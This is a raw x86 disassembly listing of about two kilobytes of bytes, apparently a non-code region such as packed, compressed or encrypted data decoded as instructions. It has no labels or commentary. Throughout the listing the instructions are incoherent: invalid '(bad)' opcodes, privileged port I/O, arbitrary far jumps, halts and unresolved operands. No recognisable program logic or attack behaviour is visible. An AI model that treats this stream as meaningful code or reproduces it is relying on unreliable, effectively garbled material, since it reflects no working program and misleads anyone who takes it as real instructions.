  42077a:	adc    bl,cl
  42077c:	in     al,0xc7
  42077e:	ja     0x4207c5
  420780:	shl    ebp,0x20
  420783:	mov    esp,0x35314419
  420788:	xchg   esi,eax
  420789:	and    esp,esp
  42078b:	mov    edx,0xca0957a6
  420790:	and    edx,DWORD PTR [eax+0x1b37950b]
  420796:	fadd   DWORD PTR [ebx]
  420798:	clc    
  420799:	xchg   esi,eax
  42079a:	jns    0x42074f
  42079c:	daa    
  42079d:	mov    edi,0x7eb2de9f
  4207a2:	adc    DWORD PTR [edx-0x61],eax
  4207a5:	loop   0x4207f6
  4207a7:	dec    esp
  4207a8:	(bad)  
  4207a9:	stos   BYTE PTR es:[edi],al
  4207aa:	push   0xffffff95
  4207ac:	ret    0x22fa
  4207af:	inc    eax
  4207b0:	or     ah,BYTE PTR [ebx-0xb1e4614]
  4207b6:	je     0x420761
  4207b8:	dec    BYTE PTR [esi-0x57]
  4207bb:	fistp  DWORD PTR [ebx]
  4207bd:	xchg   esp,eax
  4207be:	and    ebp,edi
  4207c0:	nop
  4207c1:	add    DWORD PTR [ecx-0x1a],0xb33b2f20
  4207c8:	imul   BYTE PTR [ecx-0x38]
  4207cb:	xor    eax,0x4166c151
  4207d0:	inc    ebp
  4207d1:	loopne 0x4207df
  4207d3:	push   0x6e68c452
  4207d8:	pop    edi
  4207d9:	adc    al,0x1f
  4207db:	cmp    DWORD PTR [ebp-0x7086c507],ebx
  4207e1:	fld    QWORD PTR [ecx+0x4677fb65]
  4207e7:	inc    esi
  4207e8:	mov    bl,ah
  4207ea:	sub    BYTE PTR [ecx+0x50f083f],bl
  4207f0:	cli    
  4207f1:	or     eax,0xf0205826
  4207f6:	sub    BYTE PTR [edx+0x3d],al
  4207f9:	pop    eax
  4207fa:	dec    edi
  4207fb:	xor    dl,ah
  4207fd:	xor    cl,BYTE PTR [eax+eax*2-0x65]
  420801:	mov    eax,ds:0x6b0ec255
  420806:	sub    al,0x60
  420808:	int    0xfd
  42080a:	xchg   esp,eax
  42080b:	inc    ebp
  42080c:	stc    
  42080d:	inc    esp
	...
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx-0xc24d003]
  420828:	cmp    al,0x13
  42082a:	add    al,0x85
  42082c:	add    DWORD PTR [eax],eax
  42082e:	cld    
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [esi+edx*2],cl
  420834:	lods   al,BYTE PTR ds:[esi]
  420835:	dec    ebx
  420836:	mov    bl,0xa
  420838:	stc    
  420839:	retf   
  42083a:	dec    edi
  42083b:	test   eax,0xa00f6b04
  420840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420841:	push   0xffffffcb
  420843:	ds std 
  420845:	stos   BYTE PTR es:[edi],al
  420846:	sub    ch,BYTE PTR [ecx+0x78905496]
  42084c:	push   0x14
  42084e:	jle    0x4208b3
  420850:	cmp    ecx,DWORD PTR [ebp-0x5a1ed566]
  420856:	and    al,0x15
  420858:	push   ecx
  420859:	and    ebx,DWORD PTR [ebp-0x25d7ef87]
  42085f:	outs   dx,DWORD PTR ds:[esi]
  420860:	aas    
  420861:	xchg   ebx,eax
  420862:	(bad)  
  420863:	ins    BYTE PTR es:[edi],dx
  420864:	lock dec ecx
  420866:	jo     0x4207f5
  420868:	shr    BYTE PTR [ecx+0x17],0xb5
  42086c:	cmp    DWORD PTR [ebx-0x4db374a3],ebp
  420872:	mov    ah,0xa9
  420874:	int    0xa5
  420876:	dec    eax
  420877:	test   DWORD PTR [edi],edx
  420879:	fdivr  QWORD PTR [ecx]
  42087b:	out    0x14,al
  42087d:	aaa    
  42087e:	pop    ss
  42087f:	pop    ebp
  420880:	stos   DWORD PTR es:[edi],eax
  420881:	sub    bh,al
  420883:	aaa    
  420884:	adc    DWORD PTR [edx+edx*2+0x1a],eax
  420888:	popf   
  420889:	inc    ecx
  42088a:	add    DWORD PTR [esi],esp
  42088c:	mov    edx,0x671ae42
  420891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420892:	fs adc al,0x63
  420895:	jecxz  0x420913
  420897:	in     al,dx
  420898:	pop    esi
  420899:	gs sub bl,dh
  42089c:	stos   DWORD PTR es:[edi],eax
  42089d:	and    BYTE PTR [ebx-0x45],bl
  4208a0:	int    0xcd
  4208a2:	mov    cl,0x9c
  4208a4:	mov    dl,0x38
  4208a6:	sub    ecx,0x76a23961
  4208ac:	jp     0x42087c
  4208ae:	lods   eax,DWORD PTR ds:[esi]
  4208af:	add    BYTE PTR [eax+0x8],0x93
  4208b3:	xchg   esp,eax
  4208b4:	dec    esi
  4208b5:	jno    0x4208fc
  4208b7:	jp     0x42091b
  4208b9:	stos   DWORD PTR es:[edi],eax
  4208ba:	(bad)  
  4208bb:	and    eax,0x7fcea986
  4208c0:	xchg   esp,eax
  4208c1:	mov    ah,0x9f
  4208c3:	out    dx,eax
  4208c4:	shr    DWORD PTR [ebp+eiz*8+0x12],cl
  4208c8:	aad    0xc3
  4208ca:	mov    edi,0x25637c4a
  4208cf:	mov    eax,ebp
  4208d1:	xchg   ecx,eax
  4208d2:	jmp    FWORD PTR ds:0x68b1e309
  4208d8:	data16 mov al,ds:0xb402c9a7
  4208de:	xchg   BYTE PTR [ebx],al
  4208e0:	mov    esp,0xf674c0fa
  4208e5:	pusha  
  4208e6:	hlt    
  4208e7:	pop    ebp
  4208e8:	ss inc ebx
  4208ea:	icebp  
  4208eb:	call   FWORD PTR [ebx-0x6a94e8b9]
  4208f1:	fist   DWORD PTR [eax]
  4208f3:	cmp    dh,BYTE PTR [ecx-0x53ed9e48]
  4208f9:	mov    cl,BYTE PTR [eax-0x80]
  4208fc:	shl    BYTE PTR [ebx+0x50260166],1
  420902:	fldenv [edi+0xc]
  420905:	loop   0x420904
  420907:	xchg   esi,eax
  420908:	adc    ah,BYTE PTR [eax-0x6145361b]
  42090e:	mov    edi,0xca5dbb06
  420913:	lds    esp,FWORD PTR [ebx+0x26]
  420916:	cmp    esi,DWORD PTR ds:0x9c98f8ab
  42091c:	inc    eax
  42091d:	mov    ebp,0x9566aff
  420922:	or     BYTE PTR [esi],al
  420924:	cs repz mov edi,0x9448cb73
  42092b:	shl    BYTE PTR [eax+esi*2+0x1c],1
  42092f:	sub    eax,0xe26e1687
  420934:	cmp    DWORD PTR [ecx+ebp*8+0x35fbd585],edx
  42093b:	push   ebp
  42093c:	test   BYTE PTR [edx],al
  42093e:	xor    BYTE PTR [ebx+0x1e6f0ecd],bh
  420944:	arpl   WORD PTR [eax+0x1d],bp
  420947:	rcl    DWORD PTR [eax+0x62c6ec19],cl
  42094d:	and    DWORD PTR [esi],ebp
  42094f:	cli    
  420950:	fbld   TBYTE PTR ds:0x7a8b4f1c
  420956:	outs   dx,DWORD PTR ds:[esi]
  420957:	inc    ecx
  420958:	out    dx,al
  420959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42095a:	fild   QWORD PTR [edi-0x2943c0f2]
  420960:	in     al,0x30
  420962:	scas   eax,DWORD PTR es:[edi]
  420963:	popf   
  420964:	push   ds
  420965:	pop    ebp
  420966:	cdq    
  420967:	jp     0x420983
  420969:	mov    si,0xef64
  42096d:	repz aas 
  42096f:	mov    al,0x36
  420971:	fisttp QWORD PTR [edx+0x3160e59d]
  420977:	jp     0x4209a7
  420979:	outs   dx,DWORD PTR ds:[esi]
  42097a:	cmp    eax,0xf09af220
  42097f:	repz jno 0x4209f2
  420982:	outs   dx,DWORD PTR ds:[esi]
  420983:	and    DWORD PTR [eax-0x5a],ecx
  420986:	mov    ds:0x512148eb,al
  42098b:	scas   al,BYTE PTR es:[edi]
  42098c:	stc    
  42098d:	adc    DWORD PTR ds:0x9a7556b6,ebx
  420993:	xor    DWORD PTR [edx],edi
  420995:	(bad)  
  420996:	jmp    0xd6f8:0x73631eb9
  42099d:	xor    eax,DWORD PTR [ecx-0x74786ec]
  4209a3:	sub    DWORD PTR [ebx-0x18],ebp
  4209a6:	xchg   ebx,eax
  4209a7:	or     al,0xe6
  4209a9:	ret    
  4209aa:	jecxz  0x42094b
  4209ac:	bswap  ebx
  4209ae:	fisub  WORD PTR [edx]
  4209b0:	pop    edi
  4209b1:	outs   dx,DWORD PTR ds:[esi]
  4209b2:	sahf   
  4209b3:	cmp    DWORD PTR [ebx],ebx
  4209b5:	aam    0xe2
  4209b7:	sbb    DWORD PTR [bp+di+0x508c],0xa541c12e
  4209c0:	mov    BYTE PTR [edi],ch
  4209c2:	jnp    0x4209a9
  4209c4:	test   al,0x71
  4209c6:	jmp    0x6ae0ea80
  4209cb:	mov    dl,bh
  4209cd:	std    
  4209ce:	nop
  4209cf:	(bad)  
  4209d0:	leave  
  4209d1:	cwde   
  4209d2:	fwait
  4209d3:	lock pop edi
  4209d5:	or     BYTE PTR [ebp+0x5c],al
  4209d8:	adc    ch,BYTE PTR ds:0x17627998
  4209de:	sbb    ch,al
  4209e0:	pop    edx
  4209e1:	adc    ebp,DWORD PTR [ecx]
  4209e3:	sbb    eax,0x4ce9368e
  4209e8:	push   ss
  4209e9:	sub    edx,ebx
  4209eb:	mov    esi,0x4785a635
  4209f0:	outs   dx,BYTE PTR ds:[esi]
  4209f1:	push   ds
  4209f2:	shl    DWORD PTR [esi],0xd5
  4209f5:	cmp    cl,BYTE PTR [eax+0x71952077]
  4209fb:	test   eax,0x13019caa
  420a00:	aaa    
  420a01:	stc    
  420a02:	push   edx
  420a03:	ja     0x420a59
  420a05:	shl    esp,0x62
  420a08:	push   ss
  420a09:	mov    ecx,0xada511a9
  420a0e:	stc    
  420a0f:	mov    ebx,0xaad2be85
  420a14:	pop    edi
  420a15:	mov    edx,0x3f0fe342
  420a1a:	in     eax,dx
  420a1b:	add    eax,0x212a9c45
  420a20:	mov    ah,0x36
  420a22:	es fwait
  420a24:	mov    DWORD PTR [esp+ebx*8],ebx
  420a27:	mov    al,ds:0x3d1bf328
  420a2c:	xor    dh,0x0
	...
  420a37:	add    BYTE PTR [eax],al
  420a39:	add    BYTE PTR [edi],al
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420a90
  420a47:	dec    ebp
  420a48:	fwait
  420a49:	sbb    eax,0x18700
  420a4e:	cld    
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    dl,cl
  420a53:	xchg   edx,eax
  420a54:	push   0x3f
  420a56:	mov    esi,0x6d2eaf6b
  420a5b:	(bad)  
  420a5d:	rcl    DWORD PTR [edx*1+0x14d302c9],0xd1
  420a65:	or     al,0x20
  420a67:	sub    al,0x49
  420a69:	mov    BYTE PTR [esi-0x8],bl
  420a6c:	loopne 0x420a52
  420a6e:	sbb    esp,0x2c
  420a71:	mov    ds:0xb1046f3b,eax
  420a76:	mov    al,0xd6
  420a78:	aam    0x5a
  420a7a:	and    DWORD PTR [esi-0x1a2a4158],edx
  420a80:	mov    al,BYTE PTR [edi-0x928120a]
  420a86:	pop    esi
  420a87:	rcl    DWORD PTR [ecx+0x7f755053],1
  420a8d:	adc    esp,DWORD PTR [eax]
  420a8f:	dec    ecx
  420a90:	call   0xf73e:0x4831f82e
  420a97:	stc    
  420a98:	sbb    ch,0x64
  420a9b:	mov    edx,0x5041894d
  420aa0:	out    0x12,eax
  420aa2:	mov    BYTE PTR [ebp-0x326fbc38],0x85
  420aa9:	test   eax,0xac18d179
  420aae:	std    
  420aaf:	xchg   ebx,eax
  420ab0:	xor    ecx,DWORD PTR [ebx-0x2743b24c]
  420ab6:	sbb    edx,ebp
  420ab8:	inc    esp
  420ab9:	xchg   edx,eax
  420aba:	pop    ebp
  420abb:	popa   
  420abc:	shr    ecx,0xc
  420abf:	and    ch,BYTE PTR [ebx-0x3]
  420ac2:	iret   
  420ac3:	cdq    
  420ac4:	ins    DWORD PTR es:[edi],dx
  420ac5:	jmp    0x8426622a
  420aca:	mov    ds:0xeeaf9a84,eax
  420acf:	imul   edi,DWORD PTR [ebp+0x68027344],0x808b08c3
  420ad9:	or     eax,0xf0b3cbd9
  420ade:	mov    edi,0x171aca6a
  420ae3:	hlt    
  420ae4:	adc    cl,BYTE PTR [ebp+0x112a0b6c]
  420aea:	(bad)  [ecx+eiz*1-0x42]
  420aee:	inc    edx
  420aef:	stos   DWORD PTR es:[edi],eax
  420af0:	adc    al,0x9d
  420af2:	push   eax
  420af3:	loope  0x420ab2
  420af5:	mov    DWORD PTR [ebx],esp
  420af7:	and    cl,bl
  420af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420afa:	inc    esi
  420afb:	cmp    al,0xa8
  420afd:	sub    al,0x3e
  420aff:	dec    ebp
  420b00:	loopne 0x420b56
  420b02:	adc    eax,0xe2b02153
  420b07:	fdivrp st(6),st
  420b09:	pop    ebp
  420b0a:	pushw  0x7d
  420b0d:	jbe    0x420b0d
  420b0f:	test   BYTE PTR [edx+0x3e547f70],ah
  420b15:	mov    ds:0x966573ca,eax
  420b1a:	sbb    ch,ch
  420b1c:	add    DWORD PTR [edi+0x357aa0b0],edx
  420b22:	and    al,cl
  420b24:	push   es
  420b25:	int    0x12
  420b27:	jnp    0x420b74
  420b29:	mov    edi,DWORD PTR ds:0x78444e36
  420b2f:	or     BYTE PTR [eax-0xf],ch
  420b32:	mov    cl,BYTE PTR [eax+0x245139e6]
  420b38:	adc    al,0x42
  420b3a:	shr    BYTE PTR [edx-0x62],0x25
  420b3e:	sbb    ch,BYTE PTR [eax-0x73]
  420b41:	mov    edx,0x56f6e54d
  420b46:	fwait
  420b47:	mov    dh,0x9f
  420b49:	js     0x420b6d
  420b4b:	and    ch,BYTE PTR [ebx]
  420b4d:	sti    
  420b4e:	xor    ebp,DWORD PTR [edx+edi*8]
  420b51:	inc    ebp
  420b52:	jno    0x420b2a
  420b54:	ficom  WORD PTR [ebx-0x6d]
  420b57:	jg     0x420b98
  420b59:	mov    edi,0x3e79d472
  420b5e:	jle    0x420b4b
  420b60:	stc    
  420b61:	outs   dx,DWORD PTR ds:[esi]
  420b62:	push   ecx
  420b63:	test   eax,0x3a93e838
  420b68:	jmp    0x420b37
  420b6a:	mov    edi,0x51af54ac
  420b6f:	in     al,0x9b
  420b71:	in     eax,dx
  420b72:	in     al,dx
  420b73:	jmp    0xb47cd44c
  420b78:	aaa    
  420b79:	hlt    
  420b7a:	xchg   edx,eax
  420b7b:	push   esp
  420b7c:	inc    esi
  420b7d:	(bad)  
  420b7e:	adc    al,0xbb
  420b80:	sub    dl,BYTE PTR [ecx+0x12]
  420b83:	fcomip st,st(4)
  420b85:	pop    ebx
  420b86:	mov    bh,0x3b
  420b88:	adc    eax,0x57e45f00
  420b8d:	sbb    BYTE PTR [esi],ch
  420b8f:	sub    DWORD PTR [eax],0x5862458c
  420b95:	out    0x8e,eax
  420b97:	dec    esp
  420b98:	add    ecx,DWORD PTR [eax+0x6c4491c3]
  420b9e:	arpl   WORD PTR [edx+0x16],bp
  420ba1:	jae    0x420bab
  420ba3:	mov    ebp,0xed290024
  420ba8:	dec    ebp
  420ba9:	and    BYTE PTR cs:[edx-0x61],cl
  420bad:	dec    eax
  420bae:	push   es
  420baf:	jne    0x420bfe
  420bb1:	xlat   BYTE PTR ds:[ebx]
  420bb2:	dec    edx
  420bb3:	dec    dl
  420bb5:	outs   dx,BYTE PTR ds:[esi]
  420bb6:	fsubr  QWORD PTR [ebp+0x3375e7a1]
  420bbc:	rol    DWORD PTR [edi-0x36],0x8a
  420bc0:	xchg   ecx,eax
  420bc1:	mov    bh,0x9e
  420bc3:	fxch   st(6)
  420bc5:	xlat   BYTE PTR gs:[ebx]
  420bc7:	mov    bl,0x97
  420bc9:	mov    ch,BYTE PTR [eax-0x54b855c8]
  420bcf:	push   0xffffffaf
  420bd1:	mov    ds:0x12ce977b,al
  420bd7:	call   0x9ccb:0x55cdc972
  420bde:	test   eax,0x63f01766
  420be3:	mov    ch,0xf1
  420be5:	(bad)  
  420be6:	mov    edx,DWORD PTR gs:[edi+0x32387ef]
  420bed:	popa   
  420bee:	imul   esp,DWORD PTR [eax-0x21],0x49
  420bf2:	shl    edi,0x47
  420bf5:	hlt    
  420bf6:	icebp  
  420bf7:	scas   eax,DWORD PTR es:[edi]
  420bf8:	xor    cl,BYTE PTR [ebx+0x57]
  420bfb:	sahf   
  420bfc:	aaa    
  420bfd:	add    edx,eax
  420bff:	and    eax,DWORD PTR [eax]
  420c01:	in     eax,dx
  420c02:	add    al,0x8f
  420c04:	push   edi
  420c05:	into   
  420c06:	sbb    dl,BYTE PTR [esi-0x15]
  420c09:	or     edx,edi
  420c0b:	ret    
  420c0c:	enter  0x142,0x2e
  420c10:	into   
  420c11:	sub    edx,DWORD PTR [eax+eiz*4-0x7e]
  420c15:	jae    0x420c72
  420c17:	or     BYTE PTR [eax+eax*1+0x1c4849b4],0x5c
  420c1f:	fs push 0x7b
  420c22:	fnstenv [ecx+0xf84cbb3]
  420c28:	and    al,0xff
  420c2a:	jno    0x420bad
  420c2c:	mov    eax,ds:0x7419403e
  420c31:	cwde   
  420c32:	mov    ebx,0x3033285b
  420c37:	push   0xffffffc2
  420c39:	push   ds
  420c3a:	out    dx,al
  420c3b:	repz gs pop ss
  420c3e:	xchg   esi,eax
  420c3f:	inc    eax
  420c40:	and    eax,0xa9515c0
  420c45:	and    cl,BYTE PTR cs:[edx+0x39]
  420c49:	shr    DWORD PTR cs:[ebp+edi*2+0xd8],cl
	...
  420c59:	add    BYTE PTR [esi],bl
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    eax,cs
  420c67:	adc    BYTE PTR [ebx],dh
  420c69:	cdq    
  420c6a:	cld    
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    ah,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR [edx+0x7f8af495],dh
  420c77:	mov    ebx,0x3a4f8e13
  420c7c:	push   esp
  420c7d:	pop    edi
  420c7e:	xchg   ebx,eax
  420c7f:	inc    esp
  420c80:	and    ebx,DWORD PTR [edi+0xbf03097]
  420c86:	aad    0xa4
  420c88:	dec    ebp
  420c89:	outs   dx,BYTE PTR ds:[esi]
  420c8a:	je     0x420c15
  420c8c:	push   eax
  420c8d:	les    ebx,FWORD PTR [ebp+0x22]
  420c90:	push   ebp
  420c91:	dec    esp
  420c92:	lds    eax,FWORD PTR [esi-0x17]
  420c95:	add    bh,0xa6
  420c98:	jns    0x420cb5
  420c9a:	xchg   ebp,eax
  420c9b:	dec    esp
  420c9c:	out    dx,eax
  420c9d:	ret    
  420c9e:	cmp    BYTE PTR [edi],bl
  420ca0:	rcl    DWORD PTR [ecx-0x1876850b],0x60
  420ca7:	xchg   esp,eax
  420ca8:	mov    dl,0x27
  420caa:	test   al,0xde
  420cac:	adc    al,0xa7
  420cae:	ror    bl,cl
  420cb0:	push   esp
  420cb1:	adc    esp,DWORD PTR [edi-0x62ed55a9]
  420cb7:	mov    ebx,0xb4dca76a
  420cbc:	mov    ch,0x38
  420cbe:	pop    esp
  420cbf:	out    0xeb,al
  420cc1:	cmp    BYTE PTR [edi-0x75d1b9df],dl
  420cc7:	rcl    BYTE PTR [eax-0x7],cl
  420cca:	mov    cl,0xce
  420ccc:	mov    ecx,DWORD PTR [edi-0x335e5180]
  420cd2:	xchg   BYTE PTR [edx-0x42d9ef2d],cl
  420cd8:	std    
  420cd9:	out    dx,al
  420cda:	sbb    eax,0x71c2a354
  420cdf:	ins    DWORD PTR es:[edi],dx
  420ce0:	sti    
  420ce1:	sub    ecx,ebp
  420ce3:	fcomp  DWORD PTR [esi-0x2d]
  420ce6:	dec    ecx
  420ce7:	iret   
  420ce8:	in     al,0xc
  420cea:	add    eax,0xe021cdd8
  420cef:	mov    dl,0xdb
  420cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cf2:	cmp    eax,0x88e212a2
  420cf7:	ss inc esi
  420cf9:	loope  0x420d2e
  420cfb:	xor    DWORD PTR [eax+0x1c],eax
  420cfe:	xor    al,al
  420d00:	push   0x37
  420d02:	and    eax,0x426ee78c
  420d07:	int3   
  420d08:	cld    
  420d09:	pop    eax
  420d0a:	fwait
  420d0b:	or     al,0xc6
  420d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d0e:	pushf  
  420d0f:	pop    esi
  420d10:	pop    ds
  420d11:	xchg   DWORD PTR [edx+eax*1-0x7b],esi
  420d15:	mov    esi,0x160428e2
  420d1a:	aam    0x96
  420d1c:	or     edi,DWORD PTR [eax+eiz*2+0x3b]
  420d20:	dec    ecx
  420d21:	or     esp,ecx
  420d23:	pushf  
  420d24:	lea    ebp,[esi-0x50]
  420d27:	mov    al,0x5e
  420d29:	lods   al,BYTE PTR ds:[esi]
  420d2a:	jo     0x420cda
  420d2c:	mov    ebp,0xbd9d064f
  420d31:	(bad)  
  420d32:	jne    0x420cd4
  420d34:	inc    edi
  420d35:	(bad)  
  420d36:	stc    
  420d37:	test   BYTE PTR [ebx-0x75f365e],cl
  420d3d:	jne    0x420d78
  420d3f:	xchg   edx,eax
  420d40:	xchg   ecx,eax
  420d41:	add    eax,0x4fb47f90
  420d46:	mov    ds:0xbc0072b8,al
  420d4b:	out    dx,al
  420d4c:	and    ebx,DWORD PTR [esi-0x3f70ca8a]
  420d52:	sbb    al,0x94
  420d54:	les    esp,FWORD PTR [ebp-0xf]
  420d57:	dec    esi
  420d58:	adc    eax,0x8570b302
  420d5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d5e:	jge    0x420d33
  420d60:	add    eax,0xe9325745
  420d65:	adc    BYTE PTR [edi-0x3ad6ce70],ah
  420d6b:	in     al,0x8e
  420d6d:	sbb    edx,DWORD PTR [eax+0x73]
  420d70:	mov    WORD PTR [ecx],?
  420d72:	add    DWORD PTR [ecx],ecx
  420d74:	inc    edx
  420d75:	pop    edi
  420d76:	and    esp,DWORD PTR [edx+edi*8+0x21]
  420d7a:	sbb    DWORD PTR [esi-0x43bce3d2],ebp
  420d80:	aaa    
  420d81:	aad    0x4a
  420d83:	(bad)  
  420d84:	loopne 0x420d1b
  420d86:	(bad)  
  420d87:	xlat   BYTE PTR ds:[ebx]
  420d88:	adc    eax,0xa376b7f2
  420d8d:	or     esp,edx
  420d8f:	test   eax,0xfccc3b0e
  420d94:	mov    ebp,ds
  420d96:	xor    ecx,DWORD PTR [ecx+0x13b97910]
  420d9c:	fistp  QWORD PTR [edx]
  420d9e:	xchg   edx,eax
  420d9f:	test   DWORD PTR [eax+0x3f00dfe6],0x5614a62b
  420da9:	and    DWORD PTR [ebx-0x5b759a11],eax
  420daf:	dec    ah
  420db1:	mov    WORD PTR [edx-0x20267136],ds
  420db7:	mov    WORD PTR [edx],?
  420db9:	push   es
  420dba:	push   0xd8da28ac
  420dbf:	dec    esi
  420dc0:	xor    DWORD PTR [eax],esp
  420dc2:	adc    edx,DWORD PTR [edi]
  420dc4:	push   0xffffff88
  420dc6:	mov    ah,0x0
  420dc8:	jmp    0x420dc5
  420dca:	mov    ah,0x63
  420dcc:	retf   0x7019
  420dcf:	inc    esi
  420dd0:	xlat   BYTE PTR ds:[ebx]
  420dd1:	adc    BYTE PTR [ebx-0x8],dl
  420dd4:	jecxz  0x420d7b
  420dd6:	cmp    eax,0x772047ca
  420ddb:	push   ss
  420ddc:	dec    edi
  420ddd:	mov    ch,0xff
  420ddf:	out    0xa3,eax
  420de1:	jne    0x420d7e
  420de3:	cli    
  420de4:	cld    
  420de5:	(bad)  
  420de6:	sbb    al,0x2a
  420de8:	leave  
  420de9:	repnz or cl,BYTE PTR [ebp+0x719786e]
  420df0:	repnz mov esi,edi
  420df3:	loop   0x420dc1
  420df5:	add    ebp,DWORD PTR [edx]
  420df7:	and    esp,DWORD PTR [eax-0x4]
  420dfa:	cmp    ah,BYTE PTR [eax-0x5414754]
  420e00:	sub    DWORD PTR [ecx],esi
  420e02:	repz adc edi,DWORD PTR [esi+0x69]
  420e06:	out    0x4f,eax
  420e08:	cdq    
  420e09:	cmc    
  420e0a:	neg    DWORD PTR [edi]
  420e0c:	clc    
  420e0d:	jl     0x420e1f
  420e0f:	dec    edi
  420e10:	jg     0x420e53
  420e12:	pop    ebp
  420e13:	sti    
  420e14:	mov    DWORD PTR [esi],esi
  420e16:	jne    0x420df1
  420e18:	sbb    bl,BYTE PTR [edi-0x26f9c0ad]
  420e1e:	and    eax,0xa3d1808e
  420e23:	cmp    DWORD PTR [ebx-0x6befcd5a],ebx
  420e29:	aas    
  420e2a:	xor    DWORD PTR [ecx+0x1c999351],ebp
  420e30:	mov    edx,0xed2f643d
  420e35:	fdivp  st(7),st
  420e37:	aaa    
  420e38:	out    0x18,eax
  420e3a:	mov    bh,0x8b
  420e3c:	sahf   
  420e3d:	dec    esp
  420e3e:	stc    
  420e3f:	mov    DWORD PTR [ebx+eax*4],ecx
  420e42:	inc    ecx
  420e43:	dec    ebp
  420e44:	mov    esi,0x45e52093
  420e49:	pop    ecx
  420e4a:	rcl    DWORD PTR [eax+0x4ef9e7f7],0x21
  420e51:	and    ebx,ebp
  420e53:	pop    esi
  420e54:	out    0x5e,al
  420e56:	out    dx,eax
  420e57:	inc    eax
  420e58:	imul   edi,DWORD PTR [ebx+0x4b],0xb5105216
  420e5f:	dec    ebx
  420e60:	inc    edi
  420e61:	jb     0x420e01
  420e63:	pop    edi
  420e64:	stos   BYTE PTR es:[edi],al
  420e65:	push   eax
  420e66:	mov    bh,0xaa
  420e68:	inc    eax
  420e69:	lahf   
  420e6a:	rol    al,1
  420e6c:	aas    
  420e6d:	inc    esi
	...
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e88
  420e87:	pop    ebx
  420e88:	jle    0x420e10
  420e8a:	clc    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    ah,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    BYTE PTR [esi],dl
  420e93:	sti    
  420e94:	pop    esp
  420e95:	mov    bh,0x33
  420e97:	outs   dx,DWORD PTR ds:[esi]
  420e98:	pop    es
  420e99:	int3   
  420e9a:	dec    edi
  420e9b:	jmp    0xd2e:0x77dc27be
  420ea2:	sbb    bh,BYTE PTR [ebp+0x5a]
  420ea5:	jne    0x420f25
  420ea7:	loop   0x420e30
  420ea9:	mov    ebp,0x3e8ac057
  420eae:	rcl    esi,cl
  420eb0:	xchg   esp,eax
  420eb1:	push   ds
  420eb2:	sub    bh,BYTE PTR [esi-0x2868dc4a]
  420eb8:	mov    eax,0x137dc586
  420ebd:	jne    0x420e45
  420ebf:	int3   
  420ec0:	int3   
  420ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ec2:	xlat   BYTE PTR ds:[ebx]
  420ec3:	dec    ebx
  420ec4:	lahf   
  420ec5:	shr    BYTE PTR [ecx],cl
  420ec7:	xchg   esp,eax
  420ec8:	adc    DWORD PTR [ebx-0x7c],eax
  420ecb:	add    DWORD PTR [edi-0x33],esi
  420ece:	dec    BYTE PTR [esi-0x44]
  420ed1:	icebp  
  420ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed3:	dec    ebp
  420ed4:	push   ss
  420ed5:	sti    
  420ed6:	repz mov eax,0xf2368aba
  420edc:	cmp    DWORD PTR [esp+ebp*2-0x4e],ebp
  420ee0:	(bad)  
  420ee2:	xchg   esi,eax
  420ee3:	out    dx,eax
  420ee4:	jmp    0x9d558fd4
  420ee9:	adc    eax,0x616adc91
  420eee:	mov    edi,0x3dbcebdb
  420ef3:	shl    DWORD PTR [eax-0xeccb15f],1
  420ef9:	add    eax,0x38579953
  420efe:	push   edx
  420eff:	jl     0x420ed4
  420f01:	fwait
  420f02:	clc    
  420f03:	sbb    BYTE PTR [edx+0x39bc80c3],al
  420f09:	fbld   TBYTE PTR ds:0xa2e7cb19
  420f0f:	loopne 0x420e9d
  420f11:	fisttp QWORD PTR [eax]
  420f13:	shl    DWORD PTR ss:[ebx],cl
  420f16:	test   BYTE PTR ds:0x22278739,dl
  420f1c:	mov    edx,0xa20519fe
  420f21:	xor    eax,0x4c9ec583
  420f26:	(bad)  
  420f27:	out    dx,eax
  420f28:	in     al,dx
  420f29:	outs   dx,BYTE PTR ds:[esi]
  420f2a:	dec    ebx
  420f2b:	arpl   bp,si
  420f2d:	xchg   edi,eax
  420f2e:	push   ds
  420f2f:	jmp    edx
  420f31:	push   ds
  420f32:	jge    0x420f47
  420f34:	cmc    
  420f35:	out    0xf0,al
  420f37:	mov    cl,BYTE PTR [esi+0x6a]
  420f3a:	xchg   BYTE PTR [esi+0x74bcd301],bl
  420f40:	push   es
  420f41:	or     eax,DWORD PTR [edx+0x33b79492]
  420f47:	aaa    
  420f48:	mov    cl,0xf9
  420f4a:	in     eax,0x76
  420f4c:	out    0x15,al
  420f4e:	adc    eax,0xd9b9225
  420f53:	test   DWORD PTR [ecx+eax*2],ebp
  420f56:	jl     0x420f0e
  420f58:	sbb    al,BYTE PTR [edx+0x33]
  420f5b:	pop    esi
  420f5c:	sbb    eax,DWORD PTR [esi-0x77]
  420f5f:	push   ebp
  420f60:	xor    edx,esp
  420f62:	retf   0x32e4
  420f65:	(bad)  
  420f66:	fcmove st,st(1)
  420f68:	jne    0x420eff
  420f6a:	stc    
  420f6b:	cmc    
  420f6c:	inc    ch
  420f6e:	in     al,0xd2
  420f70:	pop    ss
